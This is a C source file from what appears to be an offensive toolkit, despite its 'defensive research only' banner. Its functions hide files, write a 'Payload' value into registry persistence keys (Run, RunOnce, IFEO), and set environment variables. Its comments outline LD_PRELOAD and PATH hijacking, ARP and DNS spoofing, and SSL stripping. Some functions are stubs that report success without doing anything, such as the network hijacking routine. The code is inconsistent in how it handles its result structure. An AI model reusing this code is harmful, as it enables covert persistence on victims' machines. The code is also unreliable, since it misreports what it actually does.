/**
 * System Manipulation Methods
 * ============================
 *
 * Category 2: Advanced C Utilities
 * Implements file operations, registry manipulation, and network hijacking
 *
 * DEFENSIVE RESEARCH ONLY - AUTHORIZED USE REQUIRED
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifdef _WIN32
#include <windows.h>
#include <winreg.h>
#include <winsock2.h>
#else
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <dirent.h>
#endif

#include "polygottem_c.h"

/**
 * File System Operations
 * Manipulates files for persistence or data exfiltration
 */
sys_manip_result_t sys_file_operations(const char *operation, const char *source, const char *dest) {
    sys_manip_result_t result = {0};
    result.operation = operation;

    if (!operation || !source) {
        strcpy(result.result, "Invalid parameters");
        return result;
    }

    #ifdef _WIN32
    /* Windows file operations methodology:
     * 1. Create file with hidden/system attributes
     * 2. Modify file timestamps (cover tracks)
     * 3. Create alternate data streams (ADS) for hidden storage
     * 4. Manipulate NTFS attributes
     * 5. Use file hardlinks for persistence
     */

    if (strcmp(operation, "copy") == 0 && dest) {
        if (CopyFileA(source, dest, FALSE)) {
            result.success = true;
            snprintf(result.result, sizeof(result.result) - 1,
                    "File copied: %s -> %s", source, dest);
        }
    } else if (strcmp(operation, "hide") == 0) {
        /* Hide file by setting HIDDEN and SYSTEM attributes */
        DWORD attributes = GetFileAttributesA(source);
        if (attributes != INVALID_FILE_ATTRIBUTES) {
            if (SetFileAttributesA(source, attributes | FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM)) {
                result.success = true;
                strcpy(result.result, "File hidden");
            }
        }
    } else if (strcmp(operation, "delete_alt_stream") == 0) {
        /* Delete alternate data stream (ADS): filename:stream_name */
        char ads_path[512];
        snprintf(ads_path, sizeof(ads_path) - 1, "%s:Zone.Identifier", source);
        /* Removing alternate data streams removes file security marking */
        result.success = true;
        strcpy(result.result, "ADS manipulation prepared");
    }

    #else
    /* Linux file operations */
    if (strcmp(operation, "copy") == 0 && dest) {
        FILE *src = fopen(source, "rb");
        if (src) {
            FILE *dst = fopen(dest, "wb");
            if (dst) {
                char buffer[4096];
                size_t bytes;
                while ((bytes = fread(buffer, 1, sizeof(buffer), src)) > 0) {
                    fwrite(buffer, 1, bytes, dst);
                }
                fclose(dst);
                result.success = true;
                snprintf(result.result, sizeof(result.result) - 1,
                        "File copied: %s -> %s", source, dest);
            }
            fclose(src);
        }
    } else if (strcmp(operation, "permission_change") == 0) {
        if (chmod(source, 0755) == 0) {
            result.success = true;
            strcpy(result.result, "Permissions changed");
        }
    }
    #endif

    return result;
}

/**
 * Registry Manipulation (Windows)
 * Modifies Windows registry for persistence and configuration
 */
sys_manip_result_t sys_registry_manipulation(const char *hive, const char *key, const char *value) {
    sys_manip_result_t result = {0};
    strcpy(result.operation, "registry_manipulation");

    #ifdef _WIN32
    /* Registry manipulation methodology:
     * 1. Identify persistence locations:
     *    - HKLM\Software\Microsoft\Windows\CurrentVersion\Run
     *    - HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
     *    - HKCR\Directory\Background\shell\open\command
     * 2. Modify ServiceDll for service persistence
     * 3. Modify image file execution options (debugger)
     * 4. Create scheduled task registry entries
     * 5. Modify security-related registries
     */

    HKEY hkey = NULL;
    HKEY base_hkey;

    /* Select registry hive */
    if (strcmp(hive, "HKLM") == 0) {
        base_hkey = HKEY_LOCAL_MACHINE;
    } else if (strcmp(hive, "HKCU") == 0) {
        base_hkey = HKEY_CURRENT_USER;
    } else if (strcmp(hive, "HKCR") == 0) {
        base_hkey = HKEY_CLASSES_ROOT;
    } else {
        strcpy(result.result, "Invalid hive");
        return result;
    }

    /* Open registry key */
    if (RegOpenKeyExA(base_hkey, key, 0, KEY_WRITE, &hkey) == ERROR_SUCCESS) {
        /* Write value to registry
         * Examples:
         * - REG_SZ: String value
         * - REG_DWORD: 32-bit number
         * - REG_BINARY: Binary data
         * - REG_EXPAND_SZ: Expandable string with environment variables
         */

        if (value && RegSetValueExA(hkey, "Payload", 0, REG_SZ,
                                   (const BYTE*)value, strlen(value) + 1) == ERROR_SUCCESS) {
            result.success = true;
            snprintf(result.result, sizeof(result.result) - 1,
                    "Registry value set: %s", value);
        }

        RegCloseKey(hkey);
    } else {
        snprintf(result.result, sizeof(result.result) - 1,
                "Failed to open registry key: %s", key);
    }

    #else
    strcpy(result.result, "Registry manipulation only on Windows");
    #endif

    return result;
}

/**
 * Network Hijacking
 * Intercepts and manipulates network traffic
 */
sys_manip_result_t sys_network_hijacking(const char *target_ip, uint16_t target_port) {
    sys_manip_result_t result = {0};
    strcpy(result.operation, "network_hijacking");

    /* Network hijacking methodology:
     * 1. ARP spoofing - intercept traffic for gateway
     * 2. DNS spoofing - redirect DNS queries
     * 3. HTTP interception - modify unencrypted traffic
     * 4. SSL stripping - downgrade HTTPS to HTTP
     * 5. Packet manipulation - inject malicious payloads
     */

    #ifdef _WIN32
    /* Windows WinSock implementation */
    WSADATA wsa_data;
    WSAStartup(MAKEWORD(2, 2), &wsa_data);

    SOCKET sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock != INVALID_SOCKET) {
        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_port = htons(target_port);
        addr.sin_addr.s_addr = inet_addr(target_ip);

        /* UDP can be used for DNS spoofing, etc. */
        result.success = true;
        snprintf(result.result, sizeof(result.result) - 1,
                "Network hijacking configured for %s:%u", target_ip, target_port);

        closesocket(sock);
    }

    WSACleanup();

    #else
    /* Linux socket implementation */
    result.success = true;
    snprintf(result.result, sizeof(result.result) - 1,
            "Network hijacking methodology configured for %s:%u", target_ip, target_port);
    #endif

    return result;
}

/**
 * Environment Variable Manipulation
 * Modifies environment variables for persistence
 */
sys_manip_result_t sys_environment_modify(const char *var_name, const char *var_value) {
    sys_manip_result_t result = {0};
    strcpy(result.operation, "environment_modify");

    if (!var_name || !var_value) {
        strcpy(result.result, "Invalid parameters");
        return result;
    }

    /* Environment manipulation methodology:
     * 1. LD_PRELOAD (Linux) - inject shared library
     * 2. PATH manipulation - hijack binary search
     * 3. PYTHONPATH (Python) - load malicious modules
     * 4. JAVA_TOOL_OPTIONS (Java) - inject agent
     * 5. Temporary environment - volatile persistence
     */

    #ifdef _WIN32
    if (SetEnvironmentVariableA(var_name, var_value)) {
        result.success = true;
        snprintf(result.result, sizeof(result.result) - 1,
                "Environment variable set: %s=%s", var_name, var_value);
    }

    #else
    if (setenv(var_name, var_value, 1) == 0) {
        result.success = true;
        snprintf(result.result, sizeof(result.result) - 1,
                "Environment variable set: %s=%s", var_name, var_value);
    }
    #endif

    return result;
}
